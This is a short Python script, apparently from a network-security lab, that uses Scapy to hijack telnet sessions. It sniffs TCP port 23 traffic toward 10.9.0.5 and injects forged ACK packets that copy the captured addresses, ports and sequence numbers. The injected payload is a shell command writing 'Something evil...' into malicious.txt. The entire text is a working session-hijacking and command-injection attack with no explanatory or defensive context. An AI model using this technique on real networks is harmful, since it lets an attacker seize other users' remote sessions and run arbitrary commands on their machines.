#!/usr/bin/env python3
from scapy.all import *

def hijack(pkt):
    ls(pkt) # Provides details
    ip = IP()
    ip.dst = pkt[IP].dst
    ip.src = pkt[IP].src
    tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="A", seq=pkt[TCP].seq, ack=pkt[TCP].ack)
    data=' "echo Something evil..." > malicious.txt\n '
    send(ip/tcp/data, verbose=0)

# Returns network interface
def get_iface(dest_ip):
    res = subprocess.run(["ip", "route", "get", dest_ip], capture_output=True, text=True, check=True)
    out = res.stdout.split()
    if "dev" in out:
        return out[out.index("dev") + 1]
    raise RuntimeError("Could not find interface")

def main():
    capture = sniff(iface=get_iface('10.9.0.5'), filter='tcp and port 23', prn=hijack)

if __name__ == "__main__":
    main()